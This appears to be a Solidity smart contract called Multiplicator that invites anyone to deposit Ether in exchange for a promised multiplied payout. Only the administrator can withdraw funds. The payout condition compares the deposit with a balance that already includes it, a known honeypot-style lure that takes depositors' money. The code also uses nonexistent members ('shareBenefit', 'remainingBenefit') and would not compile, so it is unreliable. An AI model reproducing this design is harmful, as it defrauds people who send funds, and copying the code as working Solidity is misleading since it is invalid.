// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Administrator = msg.sender;

    function()payable{}

    function claimBenefit()
    payable
    public
    {
        require(msg.sender == Administrator);
        Administrator.shareBenefit(this.remainingBenefit);
    }

    function multiplicate(address adr)
    payable
    {
        if(msg.value>=this.remainingBenefit)
        {
            adr.shareBenefit(this.remainingBenefit+msg.value);
        }
    }
}